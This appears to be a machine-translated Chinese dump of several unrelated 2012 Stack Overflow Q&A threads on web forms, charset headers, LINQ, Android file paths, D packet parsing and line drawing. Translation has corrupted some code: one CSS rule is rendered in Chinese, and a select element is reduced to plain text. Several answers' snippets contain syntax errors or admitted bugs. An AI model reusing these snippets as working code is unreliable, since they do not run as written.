window.location = "https://www.asdfg.com" //Something like this

<style>
div.selectBox
{position:relative;display:inline-block;cursor:default;
text-align:left;lineheight:30px;clear:both;color:#888;}
span.selected
{width:167px;text-indent:20px;border:1px solid #ccc;border-right:none;border-top-left-radius:5px;
 border-bottom-left-radius:5px;background:#FFFFFF;overflow:hidden;}
 span.selectArrow
 {width:30px;border:1px solid #FFFFFF;border-top-right-radius:4px;border-bottom- right-radius:4px;
 text-align:center;font-size:20px;-webkit-user-select: none;-khtml-user-select: none;
-moz-user-select: none; -o-user-select: none;user-select: none;background:#FFFFFF;}

span.selectArrow,span.selected 
```

{位置：相对；浮动：左；高度：30px；z-index：1；}

```
div.selectOptions
{position:absolute;top:28px;left:0;width:198px;border:1px solid #ccc;border-bottom-      right-radius:5px;
border-bottom-left-radius:5px;overflow:hidden;background:#FFFFFF;padding-top:2px;display:none;}

span.selectOption
{display:block;width:80%;line-height:20px;padding:5px 10%;}

span.selectOption:hover
{color:#ffffff; background:#4096ee;} 
</style>

<body>
<h1>Registration form</h1>
<form id=payment>
<fieldset>
<legend>Account Information</legend>
<ol> 
<li><input id=name name=name size="40" type=text placeholder="User Name" required autofocus></li>
<li><input id=email name=email type=email placeholder="Password" required></li> 
<li><input id=phone name=phone type=tel placeholder="Verify Password" required></li> 
</ol>
</fieldset> 

<fieldset>
<legend>User Details</legend> 
 <ol> 
 <li><input id=name name=name type=text placeholder="First Name" required autofocus>   </li>
 <li><input id=name name=name type=text placeholder="Last Name" required autofocus></li>
 <li><input id=name name=name type=text placeholder="Email ID" required autofocus></li>
 <li><input id=email name=email type=email placeholder="Company" required></li> 
 <li><input id=phone name=phone type=tel placeholder="Telephone No" required></li> 
```

*   选择国家 [选择国家] 印度 新加坡 美国

```
 </div>
 </li>
 <li> 
<button type=submit>Register</button>
</fieldset> 
</form> 
</section>
</div>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:25:37.613

你的意思是喜欢

html:

```
<input type="button" id="registerbutton" value="Register" /> 
```

js：

```
$("#registerbutton").click(function () { register(); });

function register() {
    $("#myform").validate();

    if ($("#myform").valid()) {
        window.location = 'http://stackoverflow.com/';
    }
} 
```

如果您想发布表单，我认为您必须使用 $.ajax 并在成功回调时重定向。也让你的概念正确，看看烤的评论。

# firefox - 未声明带框文档的字符编码

> ID：13491641
> 
> 赞同：7
> 
> 时间：2012-11-21T10:51:07.797
> 
> 标签：firefox, character-encoding, document, declare

在开发我的网站时，我在 FF 中收到此警告。我找不到任何关于它的真实信息以及如何解决这个问题。

```
the character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.

...e)});else for(var g in a)ca(g,a[g],c,e);return d.join("&").replace(bD,"+")}}),f.... 
```

jquery....min.js（第 4 行）

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-07T04:30:18.333

你需要把

`<meta http-equiv="Content-type" content="text/html;charset=UTF-8">`

在 iframe 或您正在使用的任何字符集编码的头部。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2022-01-26T12:58:23.487

在您的情况下，看起来您正在提供一个 javascript 文件。为了设置字符编码，您必须`Content-Type`在提供 javascript 文件时在 HTTP 标头中设置它。

例如：

```
Content-Type: application/javascript; charset=utf-8 
```

但是，如果您使用`<iframe>`元素来引用 javascript，那么您做错了。

你应该只使用 an`<iframe>`来显示一些东西，比如 HTML、文本、SVG、PDF 等。

对于 HTML 文档，您可以在文件中[使用](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-charset)[tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#attr-charset)和 tag 上[的](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-charset)[属性](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#attr-charset)设置`.html`字符编码。请注意，后者已被弃用，所有现代浏览器都将读取引用该脚本的文档的标签。`charset`[`<meta>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#attr-charset)[`<script>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-charset)`<meta>`

### 例子

*iframed.html*

```
<head>
  <meta http-equiv="Content-type" content="text/html;charset=UTF-8">
  <script src="jquery....min.js" charset="utf-8"></script>
  <!-- note: setting charset on a <script> tag is deprecated -->
</head> 
```

*索引.html*

```
<body>
  <iframe src="iframed.html">
</body> 
```

如果您可以访问您的 Web 服务器，那么您可以将字符编码设置为响应的一部分，`Content-Type`而无需在文档中指定它。

*   HTML：`Content-Type: text/html; charset=utf-8`
*   JS：`Content-Type: application/javascript; charset=utf-8`
*   JSON：`Content-Type: application/json; charset=utf-8`
*   文本：`Content-Type: text/plain; charset=utf-8`

在[nodejs 中](https://nodejs.org/)，您使用对象`setHeader`上的方法`Response`。

```
response.setHeader ('Content-Type', 'text/html; charset=utf-8') 
```

### 开发工具

您可以使用浏览器的 DevTools 来检查网络请求并检查`Content-Type`header 的值。请参阅下面的屏幕截图。

[![DevTools 中 Network 选项卡的屏幕截图，显示 jQuery 的 Content-Type 标头](../Images/319dd2d7fe46f90c86008cf82603fa13.png)](https://i.stack.imgur.com/aua6l.png)

# c# - Enumerable.Repeat with Union and Take 不返回“Take”值

> ID：13491642
> 
> 赞同：3
> 
> 时间：2012-11-21T10:51:08.607
> 
> 标签：c#, linq, ienumerable

很简单的问题。我有一个值列表，我想用空值填充，这样我总是返回 X 个项目。

```
List<int> list = new List<int>() { 10, 20, 30 };

IEnumerable<int> values = list
     .OrderByDescending( i => i )
     .Union( Enumerable.Repeat( 0 , 5 ) );

foreach (var item in values.Take(5))
   Console.Write( item + " "); 
```

我希望输出像“30 20 10 0 0”但令人惊讶的是我只得到“30 20 10 0”。

```
foreach (var i in Enumerable.Repeat( 0, 5 ).Take(3))
    Console.Write( i + " " ); 
```

此代码将返回“0 0 0”。同样，“ `list.Take(3)`”返回“30 20 10”。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:54:07.650

并集的概念，作为一种集合论运算，具有隐含的“独特性”。如果您不希望这样：使用`Concat`而不是`Union`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-21T10:54:14.753

原因是[`Enumerable.Union`](http://msdn.microsoft.com/en-us/library/bb341731.aspx)删除重复项。因此，您可能想改用`Enumerable.Concat`不删除重复项的 dsoes。

我更喜欢的另一个选项是从第二个参数是所需计数[`Enumerable.ElementAtOrdefault`](http://msdn.microsoft.com/en-us/library/bb494386.aspx)创建的索引中选择元素：[`Enumerable.Range`](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.range.aspx)

```
IEnumerable<int> values = Enumerable.Range(0, 5)
            .Select(i => list.ElementAtOrDefault(i))
            .OrderByDescending(i => i); 
```

# java - 在 JAVA 中使用 Microsoft Smart Card Minidriver

> ID：13491647
> 
> 赞同：1
> 
> 时间：2012-11-21T10:51:22.157
> 
> 标签：java, smartcard

我有一个带有 PKI 中间件（dll 库）的自定义智能卡，由以下规范编写：http: [//msdn.microsoft.com/en-us/library/windows/hardware/gg487500.aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/gg487500.aspx)

是否有用于访问卡功能的 microsoft sc minidriver 的 java 包装器，或者我必须编写自己的 JNI 方法？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T10:36:47.643

Minidriver works below a layer that is meant to be accessed by external applications (it is a plugin for the Windows system, generally speaking). What you want is access to CryptoAPI layer (from where the minidriver functionality is exposed if the card is inserted) and SunMSCAPI should provide the possibility. Have a look at [Signing documents with SunMSCAPI and suppressing the "Enter PIN" dialog](https://stackoverflow.com/questions/6496565/signing-documents-with-sunmscapi-and-suppressing-the-enter-pin-dialog) for example

# ios6 - iPhone 4 设备在更新到 iOS 6 后未连接到 xcode 4.5

> ID：13491656
> 
> 赞同：0
> 
> 时间：2012-11-21T10:51:54.377
> 
> 标签：ios6

最近我更新了我的 iPhone 4`iOS 6.0`和我`Xcode`的`4.5`。
现在是什么问题意味着我的 iPhone 4 设备没有连接到`Xcode`.
任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:12:11.170

您需要使用管理器再次将其添加到门户。

# pdf-generation - 用于将网页转换为 pdf 的 javascript 库

> ID：13491657
> 
> 赞同：10
> 
> 时间：2012-11-21T10:51:58.247
> 
> 标签：pdf-generation

是否有任何可以将网页转换为 PDF 文档的客户端库？我使用了 jspdf，但生成的 pdf 不保留格式化的 html（比如标签在 PDF 中应该是粗体）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-18T10:18:14.343

如果您的页面*没有任何敏感数据，*
则非常简单， 只需执行以下操作：

```
<a href="http://pdfcrowd.com/url_to_pdf/">Save this page to a PDF</a> 
```

* * *

或者

下载[这个](http://www.pdfmachine.com/pdfMachineSDK_1.9.9.zip)工具。

您可以在任何事件上调用它，例如：

```
<script>

  function generatePDF(){} 

  var conv = new ActiveXObject("pdfServMachine.converter");
  conv.convert("http://www.google.com", "c:\\google.pdf", false);
  WScript.Echo("finished conversion");
 }

 </script>
 <body onload="generatePDF()">
 </body> 
```

```
var conv = new ActiveXObject("pdfServMachine.converter");
conv.convert("http://www.google.com", "c:\\google.pdf", false);
WScript.Echo("finished conversion"); 
```

* * *

或
欲了解更多信息
[http://snapshotmedia.co.uk/blog/jspdf](http://snapshotmedia.co.uk/blog/jspdf)
[http://itextpdf.com/](http://itextpdf.com/)
[http://github.com/MrRio/jsPDF](http://github.com/MrRio/jsPDF)

* * *

# d3.js - Parenting D3.js-Nodes 用于拖动

> ID：13491660
> 
> 赞同：0
> 
> 时间：2012-11-21T10:52:06.810
> 
> 标签：d3.js, draggable

我有一个节点和链接网络。其中一个在中心有一个固定的位置，但可以拖动，其他的在围绕中心的一个力场中。如果用户拖动任何节点，其他节点将被拖到他身后，因为它们是链接的。是否有可能用居中的节点拖动其他节点，但保持其他节点的拖动事件单一？

谢谢你的考虑，大卫

编辑：如果有人知道将所有其他节点的拖动侦听器设置为居中的可能性，那么问题将得到解决。如果您有想法，我将不胜感激！请给我评论代码的哪些部分可以帮助您解决这个问题，我会尽快发布！

编辑：在 nrabinowitz 的帮助下，我现在可以随心所欲地移动节点了！但是新的代码部分以某种方式破坏了我的坐标限制。为了让节点不退出 svg，我给所有节点添加了一个 cx/cy-attr，防止它们越过 svg 的边界。这在开始时仍然有效，但是在第一次拖动中心节点（以及因此的“g”元素）之后，限制似乎发生了变化。除了svg，还有什么拖的吗？

提供限制的脚本部分是

```
force.on("tick", function() {

   node.attr("cx", function(d) { return d.x = Math.max(15, Math.min(width - 15, d.x)); })
       .attr("cy", function(d) { return d.y = Math.max(15, Math.min(height - 15, d.y)); });
   node.attr("transform", function(d) { return "translate(" + d.x + "," + d.y + ")"; }); 

   link.attr("x1", function(d) { return d.source.x; })
       .attr("y1", function(d) { return d.source.y; })
       .attr("x2", function(d) { return d.target.x; })
       .attr("y2", function(d) { return d.target.y; });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-24T00:52:55.010

见工作小提琴：http: [//jsfiddle.net/nrabinowitz/4Rj4z/](http://jsfiddle.net/nrabinowitz/4Rj4z/)

这将节点包含在一个`g`元素中，并使用该`transform`属性来移动它们。

为了让它工作，你不能使用`force.drag`你想要拉组的节点——你需要一个自定义的`d3.behavior.drag`. 不幸的是，根据[这个答案](https://stackoverflow.com/a/13079726/380487)，您不能将拖动处理程序放在节点本身上 - 它需要在组上。这可行，但这意味着没有单独的拖动处理程序的其他元素 - 例如链接 - 也将拖动组。您也许可以`pointer-events`在组上解决此问题。

# java - jquery datepicker和序列化问题

> ID：13491666
> 
> 赞同：2
> 
> 时间：2012-11-21T10:52:28.330
> 
> 标签：java, jquery, date, serialization, datepicker

我有输入字段作为日期选择器：

```
$(".datepicker").datepicker();
    <input name="from" type="text" class="datepicker input-small" id="input04"> 
    <input name="to" type="text" class="datepicker input-small" id="input05"> 
```

这些输入不是必需的。但是当我通过 ajax 向服务器端发送信息时（我使用序列化）：

```
$("#filterMarkers").click(function(){

            $.post(
                    "/someurl",
                    $("#myForm").serialize(),
                    function(data) {
                        console.log(data);
                    });
        }); 
```

它返回我 500 Internal Server Error 这里是服务器端堆栈跟踪：

```
org.springframework.validation.BindException: org.springframework.validation.BeanPropertyBindingResult: 2 errors
Field error in object 'bean' on field 'from': rejected value []; codes [typeMismatch.bean.from,typeMismatch.from,typeMismatch.java.util.Date,typeMismatch]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [bean.from,from]; arguments []; default message [from]]; default message [Failed to convert property value of type 'java.lang.String' to required type 'java.util.Date' for property 'from'; nested exception is org.springframework.core.convert.ConversionFailedException: Unable to convert value "" from type 'java.lang.String' to type 'java.util.Date'; nested exception is java.lang.IllegalArgumentException]
Field error in object 'bean' on field 'to': rejected value []; codes [typeMismatch.bean.to,typeMismatch.to,typeMismatch.java.util.Date,typeMismatch]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [bean.to,to]; arguments []; default message [to]]; default message [Failed to convert property value of type 'java.lang.String' to required type 'java.util.Date' for property 'to'; nested exception is org.springframework.core.convert.ConversionFailedException: Unable to convert value "" from type 'java.lang.String' to type 'java.util.Date'; nested exception is java.lang.IllegalArgumentException]
    at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.doBind(HandlerMethodInvoker.java:810)
    at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.resolveHandlerArguments(HandlerMethodInvoker.java:359)
    at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:171)
    at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:426)
    at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:414)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:790)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:719)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:644)
    at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:560)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
    at org.springframework.orm.hibernate3.support.OpenSessionInViewFilter.doFilterInternal(OpenSessionInViewFilter.java:198)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:311)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:116)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:101)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:182)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:173)
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:237)
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:167)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:293)
    at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
    at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
    at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
    at java.lang.Thread.run(Thread.java:662) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:23:23.770

您的页面绑定到正确的字段。但它返回的字符串值不是日期对象。您需要将日期类型更改为字符串并使用 dateFormate 验证并转换为日期对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T11:25:04.540

我只是以编程方式从字符串中删除了这些参数

# d - 从具有范围的分段字节流中读取数据包？

> ID：13491667
> 
> 赞同：2
> 
> 时间：2012-11-21T10:52:32.083
> 
> 标签：d, range

我相信我知道范围，但我不知道何时何地使用它们或如何使用它们。我无法“获得”范围。考虑这个例子：

* * *

假设我们有一个我们无法控制的网络处理程序，只要有一些新数据给我们，它就会在某个线程中调用我们的回调函数：

```
void receivedData(ubyte[] data) 
```

此数据流包含具有布局的数据包

```
{
    ushort size;
    ubyte[size] body;
} 
```

但是，网络处理程序并不知道这一点，因此调用`dataReceived()`可能包含一个或两个部分数据包、一个或几个完整数据包或组合。为简单起见，我们假设没有损坏的数据包，并且`data.length == 0`在连接关闭时我们会收到一个。

我们现在想要的是一些漂亮的 D 代码，将所有这些混乱变成适当的调用

```
void receivedPacket(ubyte[] body) 
```

我当然可以想到实现这一目标的“蛮力”方法。但这也许是我的困惑所在：范围可以在其中发挥作用吗？我们可以总结`receivedData()`成一个不错的范围吗？如何？或者这不是您使用范围的那种问题？为什么不？

（如果使用范围更有意义，请随意重新定义示例。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T12:49:50.453

我要做的是

```
ubyte[1024] buffer=void;//temp buffer set the size as needed...
ushort filledPart;//length of the part of the buffer containing partial packet
union{ushort nextPacketLength=0;ubyte[2] packetLengtharr;}//length of the next packet

void receivedData(ubyte[] data){
    if(!data.length)return;

    if(nextPacketLength){
        dataPart = min(nextPacketLength-filledPart.length,data.length);

        buffer[filledPart..nextPacketLength] = data[0..dataPart];
        filledPart += dataPart;

        if(filledPart == nextPacketLength){
            receivedPacket(buffer[0..nextPacketLength]);//the call
            filledPart=nextPacketLength=0;//reset state
            receivedData(datadataPart..$]);//recurse
        }
    } else{
        packetLengtharr[]=data[0..2];//read length of next packet

        if(nextPacketLength<data.length){//full paket in data -> avoid unnecessary copies
             receivedPacket(data[2..2+nextPacketLength]);
             receivedData(data[2+nextPacketLength..$]);//recurse
        }else
            receivedData(data[2..$]);//recurse to use the copy code above
    }
} 
```

它是递归的，有 3 种可能的路径：

1.  `data`为空 -> 无操作

2.  `nextPacketLength`设置为一个值！= 0 -> 将尽可能多的数据复制到缓冲区中，如果数据包完成，则调用回调并重置`filledPart`并`nextPacketLength`递归其余的`data`

3.  nextPacketLength ==0 如果完整的数据包可用调用回调，则读取数据包长度（此处使用联合），然后使用其余数据递归

当数据只包含长度的第一个字节时，只有一个错误仍然存​​在，但我会让你弄清楚（我现在懒得做）

# java - 文件处理文件路径

> ID：13491668
> 
> 赞同：0
> 
> 时间：2012-11-21T10:52:32.987
> 
> 标签：java, android, android-sdcard, android-file

基本上我有两个问题。我正在使用下面的代码来读取和写入 z 文本文件。

```
 File myFile = new File("/sdcard/mysdfile.txt");
    myFile.createNewFile();
    FileOutputStream fOut = new FileOutputStream(myFile);
    OutputStreamWriter myOutWriter = 
                            new OutputStreamWriter(fOut);
    myOutWriter.append("my text here");
    myOutWriter.close(); 
```

每次我想要这个 OPEN_OR_CREATE 时都会创建一个新文件（如果文件已经存在，请不要创建一个新文件）

我的第二个问题是如何更改路径“/sdcard/mysdfile.txt”我希望这个文件存储在我的 sdcard -> subFolder1 -> SubFolder2

纳克斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:00:15.107

代替

```
FileOutputStream fOut = new FileOutputStream(myFile); 
```

和

```
FileOutputStream fOut = new FileOutputStream(myFile, true); //true means append mode. 
```

Appart 从那我有一个建议给你。

永远不要`/sdcard`在代码中硬编码，而是考虑编写。

```
File myFile = new File(Environment.getExternalStorageDirectory(),"mysdfile.txt"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:01:20.900

尝试我的解决方案写入文本文件的末尾

```
private void writeFile (String str){
      try {
          File f = new File(Environment.getExternalStorageDirectory().toString(),"tasklist.txt");
          FileWriter fw = new FileWriter(f, true);

          fw.write(str+"\n");
          fw.flush();
          fw.close();
      } catch (Exception e) {
      }
} 
```

*File(Environment.getExternalStorageDirectory().toString()+"your/pth/here","tasklist.txt");

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:01:53.873

不要使用硬编码`/sdcard`，否则`/mnt/sdcard`您的应用程序将失败，因为设备在该存储的位置或挂载点上有所不同。要获得正确的位置，请使用

```
Environment.getExternalStorageDirectory(); 
```

请参阅[此处的文档](http://developer.android.com/reference/android/os/Environment.html#getExternalStorageDirectory%28%29)。

要将内容附加到现有文件，请使用`new FileOutputStream(myFile, true);`而不是仅在此处`new FileOutputStream(myFile);`查看[该构造函数的文档](http://developer.android.com/reference/java/io/FileOutputStream.html#FileOutputStream%28java.io.File,%20boolean%29)。

至于

> 如何更改路径“/sdcard/mysdfile.txt”

`/sdcard`除了如上所述摆脱之外，只需将子文件夹添加到路径： `MyFolder1/MyFolder2/mysdfile.txt`. 请注意，这些文件夹必须存在，否则路径将无效。您始终可以通过调用来创建它`myFile.mkdirs()`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:03:22.460

```
File dir = Environment.getExternalStorageDirectory();

File f = new File(dir+"/subFolder1/",xyz.txt); <-- HOW TO USE SUB FOLDER

if(file.exists())
{
     // code to APPEND
}
else
{
     // code to write new one
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T11:07:34.410

1> OPEN_OR_CREATE 您可以尝试或可以将 MODE_APPEND 替换为 true 就像@Vipul 的建议一样

```
FileOutputStream fOut = openFileOutput(your_path_file, MODE_APPEND);

//it means if the file is exist the content you want write will append into it. 
```

2> 存储在我的 sdcard -> subFolder1 -> SubFolder2

您可以使用 Environment.getExternalStorageDirectory().getAbsolutePath() 获取 SDCard 的完整文件路径。然后连接字符串以获取您想要的文件路径。前任：

```
String baseDir = Environment.getExternalStorageDirectory().getAbsolutePath();
String fileName = "myFile.txt";

File f = new File(baseDir + File.separator  + subfolder1 + File.separator +  subfoler2, fileName); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-21T11:13:16.720

在 Java 7 中，我们可以这样做：

```
Path path = Paths.get("/sdcard/mysdfile.txt");
BufferedWriter wrt = Files.newBufferedWriter(path, StandardCharsets.UTF_8, StandardOpenOption.APPEND); 
```

# asp.net - 带有特殊字符的QueryString值在IE中变成一个正方形

> ID：13491674
> 
> 赞同：0
> 
> 时间：2012-11-21T10:52:47.533
> 
> 标签：asp.net, query-string, special-characters, url-encoding

我试图从 ASP.NET 中的查询字符串中了解特殊字符。在其他所有浏览器中，这都能完美运行：`mysite.com?s=smør`，但在 IE 中，它会将**ø**字母写成正方形。

我已经搜索了高低的解决方案并阅读了相关信息`Server.UrlEncode()`，但`Server.UrlEncode()`写道： sm%ef%bf%bdr 这对用户来说也不是很愉快;-)

在页面上的任何地方写 ÆØÅ 时，它都能完美运行，所以一定是因为它以某种方式来自查询字符串。

我的代码如下：

```
@* Check the searchterm querystring for null or empty value *@
if (HttpContext.Current.Request.QueryString["s"] != null && !string.IsNullOrEmpty(HttpContext.Current.Request.QueryString["s"]))
{        
    string searchTerm = Server.UrlEncode(HttpContext.Current.Request.QueryString["s"]);        
    <span>@Server.UrlDecode(searchTerm)</span>
} 
```

那么，有人知道如何解决这个问题吗？

提前致谢。

**编辑**

做了一个这样的快速修复/黑客攻击：

```
string rawUrl = Server.UrlDecode(HttpContext.Current.Request.RawUrl);
string searchTerm = rawUrl.Substring(rawUrl.IndexOf('=') + 1); 
```

虽然它并不漂亮;-)

# jquery - 如果 e.target 不是 xxx 的孩子，请执行某些操作

> ID：13491675
> 
> 赞同：1
> 
> 时间：2012-11-21T10:52:50.537
> 
> 标签：jquery

我想在用户悬停元素时更改元素的 z-index，并在用户鼠标悬停时重新初始化它。

但我的问题是我无法知道如何知道用户何时将我的元素的子项悬停以悬停，或者他是否要离开该元素。

我试过了：

```
 var controlsWrapper = $('#controls-wrapper');

controlsWrapper.on('mouseover', function() {
    console.log('in');          
})
controlsWrapper.on('mouseout', function(e) {
    if(!controlsWrapper.has(e.target)) {
        console.log('out');
    }
}) 
```

# javascript - 获取2点之间的所有像素坐标

> ID：13491676
> 
> 赞同：10
> 
> 时间：2012-11-21T10:52:53.157
> 
> 标签：javascript, math, canvas, html5-canvas

我想在一条直线上获得 2 个给定点之间的所有 x,y 坐标。虽然这似乎是一件容易的事，但我似乎无法理解它。

因此，例如：

*   第 1 点：(10,5)
*   第 2 点：（15,90）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-21T11:04:41.687

**编辑：**下面的解决方案仅适用于几何角度。在屏幕上绘图与理论几何不同，您应该听听人们建议 Bresenham 的算法。

* * *

给定两个点，并且知道直线的方程是`y = m*x + b`，`m`斜率和`b`截距在哪里，您可以计算`m`然后`b`将该方程应用于 A 和 B 点之间的 X 轴的所有值：

```
var A = [10, 5];
var B = [15, 90];

function slope(a, b) {
    if (a[0] == b[0]) {
        return null;
    }

    return (b[1] - a[1]) / (b[0] - a[0]);
}

function intercept(point, slope) {
    if (slope === null) {
        // vertical line
        return point[0];
    }

    return point[1] - slope * point[0];
}

var m = slope(A, B);
var b = intercept(A, m);

var coordinates = [];
for (var x = A[0]; x <= B[0]; x++) {
    var y = m * x + b;
    coordinates.push([x, y]);
}

console.log(coordinates); // [[10, 5], [11, 22], [12, 39], [13, 56], [14, 73], [15, 90]] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:00:22.067

给定 AB 中的点 A(10, 5) 和 B(15, 90) 和 C(x, y) 我们有：

```
(x - 10) / (y - 5) = (15 - 10) / (90 - 5) 
```

您可以做的是从 x=10 迭代到 x=15 并计算相应的 y。由于 x 和 y 是整数，因此有时您必须对结果进行四舍五入（或跳过它）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-05-06T10:41:06.370

根据 wiki 文章，这是我处理高线和低线的 JS 代码：

```
const drawLine = (x0, y0, x1, y1) => {
  const lineLow = (x0, y0, x1, y1) => {
    const dx = x1 - x0
    let dy = y1 - y0
    let yi = 1

    if (dy < 0) {
      yi = -1
      dy = -dy
    }

    let D = 2 * dy - dx
    let y = y0

    for (let x = x0; x < x1; x++) {
      drawPoint(x, y)

      if (D > 0) {
        y = y + yi
        D = D - 2 * dx
      }

      D = D + 2 * dy
    }
  }

  const lineHigh = (x0, y0, x1, y1) => {
    let dx = x1 - x0
    const dy = y1 - y0
    let xi = 1

    if (dx < 0) {
      xi = -1
      dx = -dx
    }

    let D = 2 * dx - dy
    let x = x0

    for (let y = y0; y < y1; y++) {
      drawPoint(x, y)

      if (D > 0) {
        x = x + xi
        D = D - 2 * dy
      }

      D = D + 2 * dx
    }
  }

  const { abs } = Math

  if (abs(y1 - y0) < abs(x1 - x0)) {
    if (x0 > x1) {
      lineLow(x1, y1, x0, y0)
    } else {
      lineLow(x0, y0, x1, y1)
    }
  } else {
    if (y0 > y1) {
      lineHigh(x1, y1, x0, y0)
    } else {
      lineHigh(x0, y0, x1, y1)
    }
  }
} 
```

# regex - 正则表达式需要在一个代码中排除两个部分

> ID：13491686
> 
> 赞同：1
> 
> 时间：2012-11-21T10:53:25.893
> 
> 标签：regex

我有这个代码：

```
10641/90X 
```

我需要一个删除两者的正则表达式

```
